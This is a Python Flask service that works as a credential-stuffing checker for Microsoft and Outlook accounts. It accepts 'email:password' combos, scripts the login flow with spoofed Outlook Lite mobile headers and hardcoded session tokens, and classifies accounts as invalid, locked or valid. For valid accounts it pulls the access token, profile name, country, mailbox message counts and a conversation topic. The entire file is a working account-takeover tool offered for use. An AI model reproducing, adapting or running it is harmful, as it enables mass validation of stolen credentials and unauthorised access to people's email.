from flask import Flask, jsonify, request
import requests
import json
import re

app = Flask(__name__)

def make_request(url, method='GET', headers=None, data=None, allow_redirects=False):
    try:
        response = requests.request(
            method=method,
            url=url,
            headers=headers or {},
            data=data,
            allow_redirects=allow_redirects
        )
        return {
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'body': response.text,
            'cookies': dict(response.cookies)
        }
    except Exception as e:
        return {'error': str(e)}

def parse_value(text, start_str, end_str=''):
    try:
        if end_str:
            pattern = f'{start_str}(.*?){end_str}'
        else:
            pattern = f'{start_str}(.*)'
        match = re.search(pattern, text)
        return match.group(1) if match else ''
    except:
        return ''

@app.route('/hot')
def check_account():
    try:
        combo = request.args.get('combo', '')
        if not combo or ':' not in combo:
            return jsonify({
                'status': 'error',
                'reason': 'Invalid combo format. Use email:password'
            })

        email, password = combo.split(':', 1)

        # First Request - Email Check
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers1 = {
            "Host": "odc.officeapps.live.com",
            "X-Oneauth-Appname": "Outlook Lite",
            "X-Office-Version": "3.19.5-minApi24",
            "X-Correlationid": "ba342407-703a-45f5-a1c9-71a3aa0ac365",
            "X-Office-Application": "145",
            "X-Oneauth-Version": "1.91.1",
            "X-Office-Platform": "Android",
            "X-Office-Platform-Version": "28",
            "Enlightened-Hrd-Client": "1",
            "X-Oneauth-Appid": "com.microsoft.outlooklite",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G988N Build/NRD90M)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate, br",
        }
        
        response1 = make_request(url1, headers=headers1)
        
        # Check for success keywords
        if not any(key in response1['body'] for key in ['MSAccount', 'OrgId', 'Placeholder']):
            return jsonify({
                'status': 'error',
                'reason': 'Invalid email format or domain'
            })

        # Second Request - Authorization
        url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
        params = {
            'mkt': 'en-US',
            'haschrome': '1',
            'login_hint': email,
            'response_type': 'code',
            'scope': 'offline_access openid profile https://outlook.office.com/M365.Access',
            'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59',
            'redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D',
            'client_info': '1'
        }
        
        headers2 = {
            "Host": "login.microsoftonline.com",
            "Sec-Ch-Ua": "\"Android WebView\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": "\"Android\"",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.67 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Return-Client-Request-Id": "false",
            "Client-Request-Id": "ba342407-703a-45f5-a1c9-71a3aa0ac365",
            "X-Ms-Sso-Ignore-Sso": "1",
            "Correlation-Id": "ba342407-703a-45f5-a1c9-71a3aa0ac365",
            "X-Client-Ver": "1.1.0+5242056e",
            "X-Client-Os": "28",
            "X-Client-Sku": "MSAL.xplat.android",
            "X-Client-Src-Sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        
        response2 = make_request(f"{url2}?{'&'.join(f'{k}={v}' for k,v in params.items())}", headers=headers2)
        
        url = parse_value(str(response2['headers']), 'Location: ', '\n')
        clientid = parse_value(response2['body'], 'client_id=', '&amp')
        uaid = parse_value(response2['body'], 'uaid=', '&')

        # Third Request
        headers3 = {
            "Host": "login.live.com",
            "Sec-Ch-Ua": "\"Android WebView\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": "\"Android\"",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.67 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Return-Client-Request-Id": "false",
            "Client-Request-Id": "ba342407-703a-45f5-a1c9-71a3aa0ac365",
            "X-Ms-Sso-Ignore-Sso": "1",
            "Correlation-Id": "ba342407-703a-45f5-a1c9-71a3aa0ac365",
            "X-Client-Ver": "1.1.0+5242056e",
            "X-Client-Os": "28",
            "X-Client-Sku": "MSAL.xplat.android",
            "X-Client-Src-Sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "close",
        }
        
        response3 = make_request(url, headers=headers3)
        
        context = parse_value(response3['body'], 'contextid=', '&')
        reftoken = response3['cookies'].get('RefreshTokenSso', '')
        mspok = response3['cookies'].get('MSPOK', '')
        oparams = response3['cookies'].get('OParams', '')

        # Fourth Request - Login
        url4 = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&contextid={context}&opid=55BA23EB3D35B260&bk=1704172932&uaid={uaid}&pid=15216"
        
        data4 = {
            'i13': '1',
            'login': email,
            'loginfmt': email,
            'type': '11',
            'LoginOptions': '1',
            'lrt': '',
            'lrtPartition': '',
            'hisRegion': '',
            'hisScaleUnit': '',
            'passwd': password,
            'ps': '2',
            'psRNGCDefaultType': '',
            'psRNGCEntropy': '',
            'psRNGCSLK': '',
            'canary': '',
            'ctx': '',
            'hpgrequestid': '',
            'PPFT': '-DjX8RVqi9lRpWrSbf4dOK0KeqCPookaalQ*e1R6XvOJ%213gd2s3KQ8ji4sWZ6wDtSjDCLDeYPUsJxujMBdBaG%21WKPXhQpnBAHCLlJHDvzcoCmDVpptBZV5LxU*XMIuQjOrlmsxKymRBLtZTM0Qm0PkQUJTkfqw4xCOogFFcIPBwHa*zegYAHuXaGp5nZs*ObGnA%24%24',
            'PPSX': 'Pass',
            'NewUser': '1',
            'FoundMSAs': '',
            'fspost': '0',
            'i21': '0',
            'CookieDisclosure': '0',
            'IsFidoSupported': '0',
            'isSignupPost': '0',
            'isRecoveryAttemptPost': '0',
            'i19': '62255',
        }
        
        headers4 = {
            "Cookie": "MSPRequ=id=N&lt=1704172932&co=1; uaid=377ae1682f6a4903a3dfe941ee9df166; RefreshTokenSso=DgS!XTcKZaXZyMCB2N7hDW7F1o0w85QVI!ZVI88h3ndZRZy8DHLeZ6JquKZ4mE!4E4rYVWj9IHVQu2QGSg2RU6Rg9g1Ui1xCpUezurxSMu3mcJ4rXhbz4q12PoCvSE7ViowDqlPEfC7RA9ZLM*Wpmr8$; MSPOK=$uuid-f0ad32d5-6f2c-43e0-8159-d171a54500ef; OParams=11O.Dn8R076JSVVYRhWdiTW!Ngk05sGC2rCP*stzofLkOLaPQzqpxSgsrGWbsR6JePXKyYPaDVSoB2wIU6lKR8OXAoJMTyYXBIO89q0ekn2UV2Rh*YPHCKFNj9TuhGK!h*4O65uJJIRBqQY90Iiba2Xwn6MkrQxK0FRpZRMfLmjnkOgBaPumF3!rhDl8VIq8Dv3dn05bufUTXxlanRJqOIRW!yy8EH24K5lq51Pat*1D1myLGB!7Pw5B2*agK!Zy8MNriEGdwlqDlbQfHrFkXeXdpmtKoG7hL4vAiUQ0LUhPbpmGYBN5Mb2v4H!2sxe5iPxXOek8R!pbg4m9KikfNs5JadfNRodS3MHkHCDByeBXp8jXsRwh8meiTy476qapgjuWJ9OTyyhyPo9tncxaZcJmWHx8!L9L5fxf19ANaXwp5GIddRvyGsFSiTnJbEwGiXHtQ9tL2r7gU1XNzmgPT24bcBen4gPGOYNq3t7hGHnI2Pvn72u7DPHcxu*IYvH7nuKlNGlSNgEVZCdH5vt8A5KcXQDAMrR4d2MtqKaz957hA8YB40TkQaI7XUPOKfnfU55AlVYKpYLJrSvzDA5laHx8snbwlCZp9fVhXY1mNnLXj9*qB5ho!pALBn4mWCZi69hijKHJsfusppkM96EDZRC59JhHgCBIxWlyKfwWcfzG6l2nRh!S4FAilfoyoogk7bsuRDp40n0omYbpm*u7KMpHxVlKw2XUz3ADcTi7UkG8K8PFdsfJ8MOUleiNiEkttZWaFL2t4UlYA*WKbMBBQEOdZgxYr!0Jkd7SasuLLsoFwrMSzVa8AYvQLMSHhRdo!V3VpQ$$;"
        }
        
        response4 = make_request(url4, 'POST', headers4, data4)

        # Check for failure keywords
        if any(key in response4['body'] for key in [
            'The account or password is incorrect',
            'Your account or password is incorrect',
            'That Microsoft account doesn\'t exist'
        ]):
            return jsonify({
                'status': 'error',
                'reason': 'Invalid credentials'
            })

        # Check for account locked
        if 'action="https://account.live.com/recover?' in response4['body']:
            return jsonify({
                'status': 'error',
                'reason': 'Account locked'
            })

        code = parse_value(str(response4['headers']), 'Location: .*?code=([^&]*)')
        cid = response4['cookies'].get('MSPCID', '')

        # Fifth Request - Get Token
        url5 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data5 = {
            'client_info': '1',
            'scope': 'profile offline_access openid service::outlook.office.com::MBI_SSL',
            'grant_type': 'authorization_code',
            'client_id': '0000000048170EF2',
            'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
            'code': code
        }
        
        headers5 = {
            "return-client-request-id": "false",
            "client-request-id": "377ae168-2f6a-4903-a3df-e941ee9df166",
            "correlation-id": "377ae168-2f6a-4903-a3df-e941ee9df166",
            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
            "Host": "login.microsoftonline.com",
            "x-client-Ver": "1.1.0+fbbab1be",
            "x-client-SKU": "MSAL.xplat.android",
            "x-client-OS": "28",
            "x-client-src-SKU": "MSAL.xplat.android",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Accept-Encoding": "gzip, deflate, br"
        }
        
        response5 = make_request(url5, 'POST', headers5, data5)
        
        try:
            atk = json.loads(response5['body'])['access_token']
        except:
            return jsonify({
                'status': 'error',
                'reason': 'Failed to get access token'
            })

        # Sixth Request - Get Profile
        url6 = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
        headers6 = {
            "Host": "substrate.office.com",
            "Authorization": f"Passport1.4 from-PP='t={atk}'",
            "X-Anchormailbox": f"CID:{cid}",
            "X-Clientrequestid": "377ae168-2f6a-4903-a3df-e941ee9df166",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G988N Build/NRD90M)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate,"
        }
        
        response6 = make_request(url6, headers=headers6)
        
        try:
            profile = json.loads(response6['body'])
            name = profile.get('displayName', '')
            country = profile.get('location', '')
        except:
            name = country = ''

        # Seventh Request - Get Mail Folders
        url7 = "https://outlook.office.com/api/beta/me/MailFolders"
        headers7 = {
            "Host": "substrate.office.com",
            "Authorization": f"Passport1.4 from-PP='t={atk}'",
            "X-Anchormailbox": f"CID:{cid}",
            "X-Clientrequestid": "377ae168-2f6a-4903-a3df-e941ee9df166",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G988N Build/NRD90M)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate,"
        }
        
        response7 = make_request(url7, headers=headers7)
        
        try:
            folders = json.loads(response7['body'])
            total_messages = sum(folder.get('TotalItemCount', 0) for folder in folders.get('value', []))
        except:
            total_messages = 0
   
        # Eighth Request - Search Messages
        url8 = "https://outlook.live.com/search/api/v1/query"
        
        search_data = {
            "Cvid": "8646103b-a6d0-2519-db86-53ccd3c0e6a5",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Cape Verde Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "Filter": {
                    "Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]
                },
                "From": 0,
                "Provenances": ["Exchange"],
                "Query": {"QueryString": str(total_messages)},
                "RefiningQueries": None,
                "Size": 25,
                "Sort": [
                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                    {"Field": "Time", "SortDirection": "Desc"}
                ],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion",
                        "NoResultModification",
                        "NoResultFolderRefinerModification",
                        "NoRequeryModification"
                    ]
                },
                "PropertySet": "ProvenanceOptimized"
            }],
            "LogicalId": "8646103b-a6d0-2519-db86-53ccd3c0e6a5"
        }

        headers8 = {
            "Host": "substrate.office.com",
            "Authorization": f"Passport1.4 from-PP='t={atk}'",
            "X-Anchormailbox": f"CID:{cid}",
            "X-Clientrequestid": "377ae168-2f6a-4903-a3df-e941ee9df166",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G988N Build/NRD90M)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json"
        }

        response8 = make_request(url8, 'POST', headers8, json.dumps(search_data))

        try:
            search_results = json.loads(response8['body'])
            conversation_topic = search_results.get('EntityResponses', [{}])[0].get('Entities', [{}])[0].get('ConversationTopic', '')
            message_count = search_results.get('EntityResponses', [{}])[0].get('Entities', [{}])[0].get('MessageCount', 0)
        except:
            conversation_topic = ''
            message_count = 0

        # Return success response with all parsed values
        return jsonify({
            'status': 'success',
            '1st': {
                'response': response1['body']
            },
            '2nd': {
                'url': url,
                'clientid': clientid,
                'uaid': uaid
            },
            '3rd': {
                'context': context,
                'reftoken': reftoken,
                'mspok': mspok,
                'oparams': oparams
            },
            '4th': {
                'code': code,
                'cid': cid
            },
            '5th': {
                'access_token': atk
            },
            '6th': {
                'name': name,
                'country': country
            },
            '7th': {
                'total_messages': total_messages
            },
            '8th': {
                'conversation_topic': conversation_topic,
                'message_count': message_count
            },
            'dev': 'aftab'
        })

    except Exception as e:
        return jsonify({
            'status': 'error',
            'reason': str(e)
        })

if __name__ == '__main__':
    app.run(debug=True)
